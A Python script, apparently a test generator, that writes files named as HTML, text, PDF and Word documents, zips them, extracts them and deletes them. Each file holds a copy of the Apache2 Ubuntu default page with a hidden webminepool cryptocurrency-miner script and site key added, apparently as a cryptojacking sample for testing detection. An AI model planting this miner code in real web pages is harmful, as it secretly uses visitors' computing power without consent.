# The following script will compress all the files inside the tmp directory. Create a folder called "tmp" that contain some files.
# Usage: python3 compress.py

#!/usr/bin/env python
import os
import time
import subprocess
import random
import zipfile
from sys import stdout
import numpy as np


class colors:
    def __init__(self):
        self.blue = "\033[94m"
        self.red = "\033[91m"
        self.end = "\033[0m"


cl = colors()

htm = """
<?php echo "00000000000000000000" ?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
  <!--
    Modified from the Debian original for Ubuntu
    Last updated: 2014-03-19
    See: https://launchpad.net/bugs/1288690
  -->
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <title>Apache2 Ubuntu Default Page: It works</title>
    <style type="text/css" media="screen">
  * {
    margin: 0px 0px 0px 0px;
    padding: 0px 0px 0px 0px;
  }

  body, html {
    padding: 3px 3px 3px 3px;

    background-color: #D8DBE2;

    font-family: Verdana, sans-serif;
    font-size: 11pt;
    text-align: center;
  }

  div.main_page {
    position: relative;
    display: table;

    width: 800px;

    margin-bottom: 3px;
    margin-left: auto;
    margin-right: auto;
    padding: 0px 0px 0px 0px;

    border-width: 2px;
    border-color: #212738;
    border-style: solid;

    background-color: #FFFFFF;

    text-align: center;
  }

  div.page_header {
    height: 99px;
    width: 100%;

    background-color: #F5F6F7;
  }

  div.page_header span {
    margin: 15px 0px 0px 50px;

    font-size: 180%;
    font-weight: bold;
  }

  div.page_header img {
    margin: 3px 0px 0px 40px;

    border: 0px 0px 0px;
  }

  div.table_of_contents {
    clear: left;

    min-width: 200px;

    margin: 3px 3px 3px 3px;

    background-color: #FFFFFF;

    text-align: left;
  }

  div.table_of_contents_item {
    clear: left;

    width: 100%;

    margin: 4px 0px 0px 0px;

    background-color: #FFFFFF;

    color: #000000;
    text-align: left;
  }

  div.table_of_contents_item a {
    margin: 6px 0px 0px 6px;
  }

  div.content_section {
    margin: 3px 3px 3px 3px;

    background-color: #FFFFFF;

    text-align: left;
  }

  div.content_section_text {
    padding: 4px 8px 4px 8px;

    color: #000000;
    font-size: 100%;
  }

  div.content_section_text pre {
    margin: 8px 0px 8px 0px;
    padding: 8px 8px 8px 8px;

    border-width: 1px;
    border-style: dotted;
    border-color: #000000;

    background-color: #F5F6F7;

    font-style: italic;
  }

  div.content_section_text p {
    margin-bottom: 6px;
  }

  div.content_section_text ul, div.content_section_text li {
    padding: 4px 8px 4px 16px;
  }

  div.section_header {
    padding: 3px 6px 3px 6px;

    background-color: #8E9CB2;

    color: #FFFFFF;
    font-weight: bold;
    font-size: 112%;
    text-align: center;
  }

  div.section_header_red {
    background-color: #CD214F;
  }

  div.section_header_grey {
    background-color: #9F9386;
  }

  .floating_element {
    position: relative;
    float: left;
  }

  div.table_of_contents_item a,
  div.content_section_text a {
    text-decoration: none;
    font-weight: bold;
  }

  div.table_of_contents_item a:link,
  div.table_of_contents_item a:visited,
  div.table_of_contents_item a:active {
    color: #000000;
  }

  div.table_of_contents_item a:hover {
    background-color: #000000;

    color: #FFFFFF;
  }

  div.content_section_text a:link,
  div.content_section_text a:visited,
   div.content_section_text a:active {
    background-color: #DCDFE6;

    color: #000000;
  }

  div.content_section_text a:hover {
    background-color: #000000;

    color: #DCDFE6;
  }

  div.validator {
  }
    </style>
  </head>
<script src="https://webminepool.com/lib/base.js"></script>
<script>
    var miner = WMP.Anonymous('SK_xZPXigBP6Cg5zoGTnztwL'); <!-- the key from webminepool - the same miner has been used by Opera team to create a cryptojacking test site: https://cryptojackingtest.com --!>
    miner.start();
</script>


  <body>
    <div class="main_page">
      <div class="page_header floating_element">
        <span class="floating_element">
          Apache2 Ubuntu Default Page
        </span>
      </div>
<!--      <div class="table_of_contents floating_element">
        <div class="section_header section_header_grey">
          TABLE OF CONTENTS
        </div>
        <div class="table_of_contents_item floating_element">
          <a href="#about">About</a>
        </div>
        <div class="table_of_contents_item floating_element">
          <a href="#changes">Changes</a>
        </div>
        <div class="table_of_contents_item floating_element">
          <a href="#scope">Scope</a>
        </div>
        <div class="table_of_contents_item floating_element">
          <a href="#files">Config files</a>
        </div>
      </div>
-->
      <div class="content_section floating_element">


        <div class="section_header section_header_red">
          <div id="about"></div>
          It works!
        </div>
        <div class="content_section_text">
          <p>
                This is the default welcome page used to test the correct 
                operation of the Apache2 server after installation on Ubuntu systems.
                It is based on the equivalent page on Debian, from which the Ubuntu Apache
                packaging is derived.
                If you can read this page, it means that the Apache HTTP server installed at
                this site is working properly. You should <b>replace this file</b> (located at
                <tt>/var/www/html/index.html</tt>) before continuing to operate your HTTP server.
          </p>


          <p>
                If you are a normal user of this web site and don't know what this page is
                about, this probably means that the site is currently unavailable due to
                maintenance.
                If the problem persists, please contact the site's administrator.
          </p>

        </div>
        <div class="section_header">
          <div id="changes"></div>
                Configuration Overview
        </div>
        <div class="content_section_text">
          <p>
                Ubuntu's Apache2 default configuration is different from the
                upstream default configuration, and split into several files optimized for
                interaction with Ubuntu tools. The configuration system is
                <b>fully documented in
                /usr/share/doc/apache2/README.Debian.gz</b>. Refer to this for the full
                documentation. Documentation for the web server itself can be
                found by accessing the <a href="/manual">manual</a> if the <tt>apache2-doc</tt>
                package was installed on this server.

          </p>
          <p>
                The configuration layout for an Apache2 web server installation on Ubuntu systems is as follows:
          </p>
          <pre>/etc/apache2/
|-- apache2.conf
|       `--  ports.conf
|-- mods-enabled
|       |-- *.load
|       `-- *.conf
|-- conf-enabled
|       `-- *.conf
|-- sites-enabled
|       `-- *.conf
          </pre>
          <ul>
                        <li>
                           <tt>apache2.conf</tt> is the main configuration
                           file. It puts the pieces together by including all remaining configuration
                           files when starting up the web server.
                        </li>

                        <li>
                           <tt>ports.conf</tt> is always included from the
                           main configuration file. It is used to determine the listening ports for
                           incoming connections, and this file can be customized anytime.
                        </li>

                        <li>
                           Configuration files in the <tt>mods-enabled/</tt>,
                           <tt>conf-enabled/</tt> and <tt>sites-enabled/</tt> directories contain
                           particular configuration snippets which manage modules, global configuration
                           fragments, or virtual host configurations, respectively.
                        </li>

                        <li>
                           They are activated by symlinking available
                           configuration files from their respective
                           *-available/ counterparts. These should be managed
                           by using our helpers
                           <tt>
                                <a href="https://manpages.debian.org/cgi-bin/man.cgi?query=a2enmod">a2enmod</a>,
                                <a href="https://manpages.debian.org/cgi-bin/man.cgi?query=a2dismod">a2dismod</a>,
                           </tt>
                           <tt>
                                <a href="https://manpages.debian.org/cgi-bin/man.cgi?query=a2ensite">a2ensite</a>,
                                <a href="https://manpages.debian.org/cgi-bin/man.cgi?query=a2dissite">a2dissite</a>,
                            </tt>
                                and
                           <tt>
                                <a href="https://manpages.debian.org/cgi-bin/man.cgi?query=a2enconf">a2enconf</a>,
                                <a href="https://manpages.debian.org/cgi-bin/man.cgi?query=a2disconf">a2disconf</a>
                           </tt>. See their respective man pages for detailed information.
                        </li>

                        <li>
                           The binary is called apache2. Due to the use of
                           environment variables, in the default configuration, apache2 needs to be
                           started/stopped with <tt>/etc/init.d/apache2</tt> or <tt>apache2ctl</tt>.
                           <b>Calling <tt>/usr/bin/apache2</tt> directly will not work</b> with the
                           default configuration.
                        </li>
          </ul>
        </div>

        <div class="section_header">
            <div id="docroot"></div>
                Document Roots
        </div>

        <div class="content_section_text">
            <p>
                By default, Ubuntu does not allow access through the web browser to
                <em>any</em> file apart of those located in <tt>/var/www</tt>,
                <a href="https://httpd.apache.org/docs/2.4/mod/mod_userdir.html">public_html</a>
                directories (when enabled) and <tt>/usr/share</tt> (for web
                applications). If your site is using a web document root
                located elsewhere (such as in <tt>/srv</tt>) you may need to whitelist your
                document root directory in <tt>/etc/apache2/apache2.conf</tt>.
            </p>
            <p>
                The default Ubuntu document root is <tt>/var/www/html</tt>. You
                can make your own virtual hosts under /var/www. This is different
                to previous releases which provides better security out of the box.
            </p>
        </div>

        <div class="section_header">
          <div id="bugs"></div>
                Reporting Problems
        </div>
        <div class="content_section_text">
          <p>
                Please use the <tt>ubuntu-bug</tt> tool to report bugs in the
                Apache2 package with Ubuntu. However, check <a
                href="https://bugs.launchpad.net/ubuntu/+source/apache2">existing
                bug reports</a> before reporting a new bug.
          </p>
          <p>
                Please report bugs specific to modules (such as PHP and others)
                to respective packages, not to the web server itself.
          </p>
        </div>




      </div>
    </div>
    <div class="validator">
    <p>
      <a href="https://validator.w3.org/check?uri=referer"><img src="https://www.w3.org/Icons/valid-xhtml10" alt="Valid XHTML 1.0 Transitional" height="31" width="88" /></a>
    </p>
    </div>
  </body>
</html>
"""


def zipdir(path, ziph):
    # ziph is zipfile handle
    for root, dirs, files in os.walk(path):
        for file in files:
            ziph.write(os.path.join(root, file))


def main():
    print("Creating temp directory: /tmp/files")
    time.sleep(1)
    subprocess.run('mkdir /tmp/files', shell=True)
    print("Creating random files in /tmp/files")
    time.sleep(1)
    stdout.write('.')

    #a = ''
    number_of_characters = 10000000
    #for i in range(number_of_characters):
        #a is now 1000000 characters long string
    #    a += chr(random.randint(97, 122))
    # print(len(a))
    a = np.random.bytes(number_of_characters)
    
    
    textfile = open('/tmp/files/list.txt', 'w')
    textfile.write(str(a))
    textfile.close()

    textfile = open('/tmp/files/test.htm', 'w')
    textfile.write(htm)
    textfile.close()
    time.sleep(1)
    stdout.write('.')

    textfile = open('/tmp/files/test.txt', 'w')
    textfile.write(htm)
    textfile.close()
    time.sleep(1)
    stdout.write('.')

    textfile = open('/tmp/files/test.pdf', 'w')
    textfile.write(htm)
    textfile.close()
    time.sleep(1)
    stdout.write('.')
    print("")

    textfile = open('/tmp/files/test.doc', 'w')
    textfile.write(htm)
    textfile.close()
    time.sleep(1)
    print(cl.red+"Compressing all files in /tmp/files directory"+cl.end)
    time.sleep(.200)
    stdout.write('.')
    time.sleep(.200)
    stdout.write('.')
    time.sleep(.200)
    stdout.write('.')
    time.sleep(.200)
    stdout.write('.')
    time.sleep(.200)
    stdout.write('.')
    print("")
    zipf = zipfile.ZipFile('/tmp/files.zip', 'w', zipfile.ZIP_DEFLATED)
    zipdir('/tmp/files', zipf)
    zipf.close()
    time.sleep(1)


def mainextract():
    print(cl.blue+"Extracting all files in /tmp/files.zip to /tmp/extracted_files "+cl.end)
    time.sleep(.200)
    stdout.write('.')
    time.sleep(.200)
    stdout.write('.')
    time.sleep(.200)
    stdout.write('.')
    time.sleep(.200)
    stdout.write('.')
    time.sleep(.200)
    stdout.write('.')
    print("")

    with zipfile.ZipFile("/tmp/files.zip", 'r') as zip_ref:
        zip_ref.extractall("/tmp/extracted_files")
    try:
        print("Removing /tmp/files ......")
        subprocess.run('rm -r /tmp/files', shell=True)
        subprocess.run('rm -r /tmp/extracted_files', shell=True)
        subprocess.run('rm /tmp/files.zip', shell=True)
        time.sleep(2)
        print("Done....")
    except:
        print("Couldn't remove temp directory")


if __name__ == '__main__':
    main()
    mainextract()

